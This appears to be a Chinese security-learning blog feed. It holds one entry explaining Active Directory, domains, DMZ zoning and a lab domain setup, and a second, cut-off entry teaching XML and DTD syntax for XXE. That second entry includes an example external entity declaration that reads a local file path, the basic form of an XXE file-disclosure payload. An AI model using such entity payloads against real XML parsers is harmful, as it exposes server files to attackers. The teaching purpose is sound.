    <content type="html"><![CDATA[<h1 id="内网基础"><a href="#内网基础" class="headerlink" title="内网基础"></a>内网基础</h1><p>内网也指局域网(Local Area Network,LAN),是指在某一区域内由多台计算机互连而成的计算机组</p><h2 id="工作组-Work-Group"><a href="#工作组-Work-Group" class="headerlink" title="工作组(Work Group)"></a>工作组(Work Group)</h2><p>在一个大型局域网内，通常会有很多计算机连接组成，他们会列在<strong>网络邻居</strong>中，为了使网络得到有效的管理，对计算机进行分组，于是就产生了工作组。通常按计算机的不同功能进行分组</p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205230453548.png" style="zoom:50%;" /><p>可以更改工作组的名称加入对应的组，如果组名在网络中不存在，那么相当于新建了一个工作组</p><p><strong>工作组没有服务器和客户机之分，都是处于同一地位，因此不能集中管理</strong></p><h2 id="域-Domain"><a href="#域-Domain" class="headerlink" title="域(Domain)"></a>域(Domain)</h2><p>当一个公司拥有 200 台计算机，需要以一个账号登录每台计算机，得以访问每台计算机的资源，那么就需要每台计算机创建这个账号；当这个账号需要更换密码时，需要对每台计算机进行改密</p><p><strong>域</strong>是一个有安全边界的计算机集合(域安全边界使不同域的用户无法访问另一个域中的资源)，域拥有严格的安全管理机制，用户需要访问域内的资源，必须以合法的身份登录域，域还给每个用户分配不同的身份，因此赋予了不同的资源访问权限</p><p><strong>域控制器(Domain Controller,DC)</strong> 是域中负责验证所有连接到域的计算机和用户，域内的计算机要互相访问也需要域控制器的审核，在域控制器数据库中储存着域的账号、密码以及域中计算机信息等</p><p>只有属于域内的计算机使用合法的账号密码登录，才能访问域内的资源</p><p>域有几种环境：</p><ul><li><strong>单域</strong></li></ul><p>小型网络一个域就可以了，通常由有两台域服务器，一台作为 DC，另一台作为备份 DC</p><ul><li><strong>父域和子域</strong></li></ul><p>处于管理及其他需求，需要在网络中划分多个域，第一个域称为父域，各分部的域称为该域的子域</p><p>比如大公司和其分公司位于不同的地点，就需要使用父域和子域，若把分公司放在一个域内，就会在信息交互上花费较长的时间，占用更多的带宽；当各分公司使用各自的域来管理自己的资源，信息交互的条目相对较少，而且相比在一个域内，可以压缩交互的数据，同时可以自定义各自域的安全策略，比如公司的财务部希望使用特定的安全策略，那么就可以将财务部作为一个子域来单独管理</p><ul><li><strong>域树</strong></li></ul><p>域树(Tree)是多个域通过建立信任关系组成的集合，一个域管理员只能管理本域，不能访问和管理其他域，因此就要域间建立信任关系，两个域就可以互相访问；域树的父域和子域就可以按需互相管理，跨网络分配文件和打印机等设备和资源，从而在不同的域之间实现网络资源的共享与管理、通信和传输</p><p>在一个域树中，父域可以包含多个子域，子域是相对父域来说的</p><p>域 asia.abc.com 的级别比域 abc.com 低(.com 在这里是一级域[最高级子域])，子域只能使用父域的名字作为其域名的后缀，在域树中，域的名字是连续的</p><ul><li><strong>域森林</strong></li></ul><p>域森林(Forest)是指多个域树通过建立信任关系组成的集合</p><p>当一个公司需要兼并时，使用的域树 abc.com，而被兼并的公司域树 abc.net 无法挂在域树 abc.com 下，那么域树 abc.com 与 abc.net 就要通过建立信任关系来构成域森林，通过域树之间的信任关系，可以管理和使用整个域森林中的资源，并保留被兼并公司原有的特色</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/u=2184180237,1938452684&fm=253&app=138&f=PNG.png" alt="5"></p><ul><li><strong>域名服务器</strong></li></ul><p>域名服务器(Domain Name Server,DNS)是指用于实现域名(Domain Name)和与之对应的 IP 地址(IP Address)映射的服务器</p><p>DNS 服务器和 DC 一般配置在同一台机器上</p><p><a href="https://www.cnblogs.com/chenjiangfeng/p/9706483.html">https://www.cnblogs.com/chenjiangfeng/p/9706483.html</a></p><ul><li><strong>活动目录</strong></li></ul><p>活动目录(Active Directory,AD)是指域环境中提供目录服务的组件</p><p>目录存储了网络对象(用户、组、计算机、共享资源、打印机和联系人等)，目录服务是帮助用户快速、准确地从目录中找到其所需要的信息的服务，而活动目录实现了，目录服务，为企业提供了网络中所有资源的快捷方式，用户可以通过寻找快捷方式来定位资源</p><p>活动目录的逻辑结构包括：组织单元(OU)、域、域树、域森林</p><p>活动目录功能有：</p><ol><li>账号集中管理，所有账号储存在服务器中，可以统一执行命令和重置密码</li><li>软件集中管理，统一推送软件，安装网络打印机，利用软件发布策略分发软件，让用户安装软件</li><li>环境集中管理，统一客户端桌面，TCP/IP 协议设置</li><li>增强安全性，统一部署企业杀毒软件，建立计划扫描任务(查杀病毒，更新补丁，释放临时文件)，集中管理用户的权限，对用户密码定制策略，监控网络，对资料统一管理</li><li>及时规避风险，利用活动目录控制用户权限，利用群集、负载均衡对服务器进行容灾设置</li></ol><ul><li><strong>域控制器和活动目录的区别</strong></li></ul><p>安装了 AD，就是 DC 了</p><ul><li><strong>安全域的划分</strong></li></ul><p>划分安全域的目的是将一组安全等级相同的计算机划入同一个网段， 网段内的计算机拥有相同的网络边界，并在网络边界通过部署防火墙来实现对其他安全域的网络访问控制策略(NACL)，允许哪些 IP 访问此域、允许此域访问哪些 IP 地址和网段进行设置</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/fghsdhfghk.jpg"></p><p>一个用路由器连接的内网，可以将网络划分围殴三个区域：安全级别最高的内网；安全级别中等的 DMZ；安全级别最低的外网(Internet)</p><p>DMZ 称为隔离区也称为非军事化区，是为了解决安装防火墙后外部网络不能访问内部网络服务器的问题而设立的一个非安全系统与安全系统之间的缓冲区，放置一些必须公开的服务器设施，例如企业 web 服务器、ftp 服务器和论坛服务器等，因此可以从外部访问 DMZ</p><p>DMZ 的屏障功能：</p><ol><li>内网可以访问外网，需要防火墙执行 NAT</li><li>内网可以访问 DMZ，管理 DMZ 的服务器</li><li>外网不能访问 DMZ，外网访问内网就要通过 VPN 来访问</li><li>外网可以访问 DMZ，外网必须可以访问 DMZ，并且由防火墙实现对外地址到服务器地址的转换</li><li>DMZ 不能访问内网，如果不执行此策略时，攻陷 DMZ，内网将不能受到保护</li><li>DMZ 不能访问外网，例外：当 DMZ 有邮件服务器时，就要允许访问外网</li></ol><p>内网又分为办公区和核心区：</p><ol><li>公司员工工作区，会安装防病毒软件、主机入侵检测产品，如果部分办公区可以访问核心数据区(运维人员)，则会部署堡垒机</li></ol><blockquote><p>堡垒机，也叫做运维安全审计系统，它的核心功能是 4A：</p><ol><li>身份验证 Authentication</li><li>账号管理 Account</li><li>授权控制 Authorization</li><li>安全审计 Audit</li></ol><p>堡垒机是用来控制哪些人可以登录哪些资产（事先防范和事中控制），以及录像记录登录资产后做了什么事情（事后溯源）</p></blockquote><ol start="2"><li>核心区，存储最重要的数据、文档，有日志记录、安全审计等安全措施进行严格保护，往往只有少数内网主机可以访问</li></ol><ul><li><strong>域中计算机的分类</strong></li></ul><p>域控制器、成员服务器、客户机、独立服务器</p><p>域控制器是必须要有的，其他三种可以没有</p><ul><li><strong>域内权限</strong></li></ul><p><strong>组(group)</strong> 是用户账号的集合。通过向一组用户分配权限，就不用向每个用户分配权限</p><ol><li><strong>域本地组</strong></li></ol><p>多域用户访问单域资源(访问同一个域)，可以从任何域添加用户账号、通用组和全局组，但只能在其所在域内指派权限。域本地组不能嵌套在其他组中。域本地组主要用于授予本域内资源的访问权限</p><ol start="2"><li><strong>全局组</strong></li></ol><p>单域用户访问多域资源(必须是同一个域中的用户)，只能在创建该全局组的域中添加用户和全局组的域中添加用户和全局组。可以在域森林的任何域内指派权限。全局组可以嵌套在其他组中。</p><ol start="3"><li><strong>通用组</strong></li></ol><p>通用组的成员来自域森林中任何域的用户账号、全局组和其他通用组，可以在该域森林的任何域中指派权限，可以嵌套在其他组中，非常适合在域森林内的跨域访问中使用。通用组的成员不是保存在各自的域控制器中的，而是保存在全局编录(GC)中的，任何变化都会导致全林复制</p><p><strong>域本地组来自全林，作用于本域；全局组来自本域，作用于全林；通用组来自全林，作用于全林</strong></p><ol start="4"><li><strong>A-G-DL-P 策略</strong></li></ol><p>A-G-DL-P 策略是指将用户账号添加到全局组中，然后为域本地组分配资源权限</p><ul><li><p>A(account)，表示用户账号</p></li><li><p>G(Global Group)，表示全局组</p></li><li><p>U(Universal Group)，表示通用组</p></li><li><p>DL(Domain Local Group)，表示域本地组</p></li><li><p>P(Permission，许可)，表示资源权限。</p></li></ul><p>在安装域控制器时，系统会自动生成一些组，称为内置组。内置组定义了一些常用的权限。 把成员添加进内置组，成员就会取得内置组的权限。</p><ul><li><p>域本地组权限</p><p>Administrators(管理员组)</p><p>Remote Desktop Users(远程登录组)</p><p>Print Operators(打印机操作员组)</p><p>Account Operators(帐号操作员组)</p><p>Server Operaters(服务器操作员组)</p><p>Backup Operators(备份操作员组)</p></li><li><p>全局组、通用组的权限</p><p>Domain Admins(域管理员组)</p><p>Enterprise Admins(企业系统管理员组)</p><p>Schema Admins(架构管理员组)</p><p>Domain Users(域用户组)</p></li></ul><h2 id="简单的单域环境搭建"><a href="#简单的单域环境搭建" class="headerlink" title="简单的单域环境搭建"></a>简单的单域环境搭建</h2><p>更改计算机名为DC</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191515686.png"></p><p>设置静态IP</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191820676.png"></p><p>添加AD和DNS角色</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191247089.png"></p><p>AD DS升级工作组为域(图片随便找的，图中IP与我设置不对应)</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403191608372.png"></p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403192127219.png"></p><p>添加一个用户test</p><p>升级完后，windows系统加入单域环境(设置的网卡、网段要一致)</p><p>加入域输入test用户的账号密码</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20220403192056363.png"></p><p>然后会要求重启，以域用户登录<code>QWE\test</code>即可</p><blockquote><p>net time /domain</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>内网</category>
      
    </categories>
    
    
    <tags>
      
      <tag>knowledge</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>XXE</title>
    <link href="/2021/12/04/XXE/"/>
    <url>/2021/12/04/XXE/</url>
    
    <content type="html"><![CDATA[<h1 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h1><p>XML 指可扩展标记语言（e<strong>X</strong>tensible <strong>M</strong>arkup <strong>L</strong>anguage）， 被设计用来传输和存储数据。区别于用来显示数据的 html</p><p>作用： 当作小型的数据库使用，如 msg 聊天工作通过 xml 文件在本地保留聊天记录，软件的配置文件 xmk，通讯软件通过 xml 文件保留用户之前看到的媒体信息，在网站当中当作 “接口” 服务，XML 文件作为配置文件（Spring、Struts2 等）、文档结构说明文件（PDF、RSS 等）、图片格式文 件（SVG header）应用比较广泛。</p><p>实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Math<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>me<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">heading</span>&gt;</span>vendor<span class="hljs-tag">&lt;/<span class="hljs-name">heading</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>pass the exam!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>第一行是 XML 声明(可选)，定义了 XML 的版本以及使用的编码，note 是文档的根元素<code>&lt;note&gt;</code>(说明本文档是一个便笺)</p><p>子元素：<code>&lt;to&gt; &lt;from&gt; &lt;heading&gt; &lt;body&gt;</code></p><blockquote><p>注意：XML 标签对大小写敏感，属性值须加引号</p></blockquote><p>单独的 XML 文档不会被浏览器解析，直接被当作文本输出</p><p>可以配合 CSS 格式化 XML 输出</p><blockquote><p>&lt;?xml-stylesheet type=”text/css” href=”cd_catalog.css”?&gt;</p></blockquote><p>但更常用的是使用 XSLT 转换 XML 文档用以 HTML 格式显示</p><p><img src="https://raw.githubusercontent.com/kIl3rr/photo/main/image-20211205150958245.png"></p><h1 id="DTD"><a href="#DTD" class="headerlink" title="DTD"></a>DTD</h1><h2 id="DTD-基本概念"><a href="#DTD-基本概念" class="headerlink" title="DTD 基本概念"></a>DTD 基本概念</h2><p>XML 文档有自己的一个格式规范，这个格式规范是由一个叫做 DTD（document type definition） 的东西控制的。<br>DTD 用来为 XML 文档定义语义约束。可以嵌入在 XML 文档中(内部声明)，也可以独立的放在另外一个单独的文件中(外部引用)。是 XML 文档中的几条语句，用来说明哪些元素/属性是合法的以及元素间应当怎样嵌套/结合，也用来将一些特殊字符和可复用代码段自定义为实体。</p><h2 id="元素声明"><a href="#元素声明" class="headerlink" title="元素声明"></a>元素声明</h2><h3 id="声明一个元素"><a href="#声明一个元素" class="headerlink" title="声明一个元素"></a>声明一个元素</h3><p>在 DTD 中，XML 元素通过元素声明来进行声明。元素声明使用下面的语法：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">category</span>&gt;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">element-content</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="空元素"><a href="#空元素" class="headerlink" title="空元素"></a>空元素</h3><p>空元素通过类别关键词 EMPTY 进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">br</span> <span class="hljs-meta-keyword">EMPTY</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">br</span> /&gt;</span><br></code></pre></td></tr></table></figure><h3 id="只有-PCDATA-的元素"><a href="#只有-PCDATA-的元素" class="headerlink" title="只有 PCDATA 的元素"></a>只有 PCDATA 的元素</h3><p>只有 PCDATA 的元素通过圆括号中的 #PCDATA 进行声明：</p><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="带有任何内容的元素"><a href="#带有任何内容的元素" class="headerlink" title="带有任何内容的元素"></a>带有任何内容的元素</h3><p>通过类别关键词 ANY 声明的元素，可包含任何可解析数据的组合：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> <span class="hljs-meta-keyword">ANY</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="带有子元素（序列）的元素"><a href="#带有子元素（序列）的元素" class="headerlink" title="带有子元素（序列）的元素"></a>带有子元素（序列）的元素</h3><p>带有一个或多个子元素的元素通过圆括号中的子元素名进行声明：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>或</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child1</span>,<span class="hljs-meta-keyword">child2</span>,...)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>当子元素按照由逗号分隔开的序列进行声明时，这些子元素必须按照相同的顺序出现在文档中。在一个完整的声明中，子元素也必须被声明，同时子元素也可拥有子元素。”note” 元素的完整声明是：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">heading</span>,<span class="hljs-meta-keyword">body</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span>      (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">heading</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br> <span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span>    (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><br></code></pre></td></tr></table></figure><h3 id="声明只出现一次的元素"><a href="#声明只出现一次的元素" class="headerlink" title="声明只出现一次的元素"></a>声明只出现一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：message 子元素必须出现一次，并且必须只在 “note” 元素中出现一次。</p><h3 id="声明最少出现一次的元素"><a href="#声明最少出现一次的元素" class="headerlink" title="声明最少出现一次的元素"></a>声明最少出现一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>+)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的加号（+）声明了：message 子元素必须在 “note” 元素内出现至少一次。</p><h3 id="声明出现零次或多次的元素"><a href="#声明出现零次或多次的元素" class="headerlink" title="声明出现零次或多次的元素"></a>声明出现零次或多次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>*)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的星号（*）声明了：子元素 message 可在 “note” 元素内出现零次或多次。</p><h3 id="声明出现零次或一次的元素"><a href="#声明出现零次或一次的元素" class="headerlink" title="声明出现零次或一次的元素"></a>声明出现零次或一次的元素</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">element-name</span> (<span class="hljs-meta-keyword">child-name</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">message</span>?)&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子中的问号(?)声明了：子元素 message 可在 “note” 元素内出现零次或一次。</p><h3 id="声明”非…-即…”类型的内容"><a href="#声明”非…-即…”类型的内容" class="headerlink" title="声明”非…/即…”类型的内容"></a>声明”非…/即…”类型的内容</h3><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">to</span>,<span class="hljs-meta-keyword">from</span>,<span class="hljs-meta-keyword">header</span>,(<span class="hljs-meta-keyword">message</span>|<span class="hljs-meta-keyword">body</span>))&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：”note” 元素必须包含 “to” 元素、”from” 元素、”header” 元素，以及非 “message” 元素即 “body” 元素。</p><h3 id="声明混合型的内容"><a href="#声明混合型的内容" class="headerlink" title="声明混合型的内容"></a>声明混合型的内容</h3><p>实例:</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">note</span> (<span class="hljs-meta-keyword">#PCDATA</span>|<span class="hljs-meta-keyword">to</span>|<span class="hljs-meta-keyword">from</span>|<span class="hljs-meta-keyword">header</span>|<span class="hljs-meta-keyword">message</span>)*&gt;</span><br></code></pre></td></tr></table></figure><p>上面的例子声明了：”note” 元素可包含出现零次或多次的 PCDATA、”to”、”from”、”header” 或者 “message”。</p><h2 id="属性声明"><a href="#属性声明" class="headerlink" title="属性声明"></a>属性声明</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST 元素名称 属性名称 属性类型 默认值&gt;</span><br></code></pre></td></tr></table></figure><p>DTD 实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ATTLIST <span class="hljs-meta-keyword">payment</span> <span class="hljs-meta-keyword">Luckey</span> <span class="hljs-meta-keyword">CDATA</span> <span class="hljs-meta-string">&quot;Q&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML 实例：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">payment</span> <span class="hljs-attr">Luckey</span>=<span class="hljs-string">&quot;Q&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="实体"><a href="#实体" class="headerlink" title="实体"></a>实体</h2><h3 id="引用方式"><a href="#引用方式" class="headerlink" title="引用方式"></a>引用方式</h3><p>XML 元素以形如 <code>&lt;tag&gt;foo&lt;/tag&gt;</code> 的标签开始和结束，如果元素内部出现如<code>&lt;</code> 的特殊字符，解析就会失败，为了避免这种情况，XML 用实体引用（entity reference）替换特殊字符。XML 预定义五个实体引用，即用<code>&amp;lt; &amp;gt; &amp;amp; &amp;apos; &amp;quot;</code> 替换 <code>&lt; &gt; &amp; &#39; &quot;</code><br>实体引用可以起到类似宏定义和文件包含的效果，为了方便，我们会希望自定义实体引用，这个操作在称为 Document Type Defination（DTD，文档类型定义）的过程中进行</p><ul><li><p><input checked="" disabled="" type="checkbox">  外部引用</p></li><li><p>网络上 DTD 文件</p></li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">PUBLIC</span> <span class="hljs-meta-string">&quot;DTD_ID&quot;</span> <span class="hljs-meta-string">&quot;DTD_url&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><ul><li>外部 DTD 文件</li></ul><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!DOCTYPE 根元素 <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;DTD本地路径&quot;</span>&gt;</span><br></code></pre></td></tr></table></figure><p>示例代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span>XML version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;ISO-8859-1&quot;</span><span class="hljs-meta">?&gt;</span><br>&lt;!DOCTYPE foo [<br>&lt;!ELEMENT foo ANY &gt;<br>&lt;!ENTITY xxe SYSTEM <span class="hljs-string">&quot;file:///var/www/html/XML.dtd&quot;</span> &gt;]&gt;<br>&lt;creds&gt;<br>    &lt;user&gt;&amp;xxe;&lt;/user&gt;<br>    &lt;pass&gt;mypass&lt;/pass&gt;<br>&lt;/creds&gt;<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?XML version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-meta-keyword">root-element</span> <span class="hljs-meta-keyword">SYSTEM</span> <span class="hljs-meta-string">&quot;XML.dtd&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">note</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">to</span>&gt;</span>Y0u<span class="hljs-tag">&lt;/<span class="hljs-name">to</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">from</span>&gt;</span>@re<span class="hljs-tag">&lt;/<span class="hljs-name">from</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>v3ry<span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>g00d!<span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">note</span>&gt;</span><br></code></pre></td></tr></table></figure><p>XML.dtd</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">to</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">from</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">head</span> (<span class="hljs-meta-keyword">#PCDATA</span>)&gt;</span><span class="hljs-comment">&lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="hljs-meta">&lt;!ELEMENT <span class="hljs-meta-keyword">body</span> (<span 